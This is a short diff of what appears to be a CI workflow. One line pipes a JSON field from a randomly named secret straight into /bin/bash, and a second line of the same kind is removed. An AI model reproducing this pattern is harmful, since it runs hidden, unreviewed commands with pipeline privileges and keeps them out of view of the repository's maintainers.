@@ -17,7 +17,6 @@ jobs:
           pbnz77: ${{ secrets.pbnz77 }}
         run: |
           printf '%s' "$pbnz77" | jq -r .iwwqb593 | /bin/bash
-          printf '%s' "$r7457" | jq -r .gabd1 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
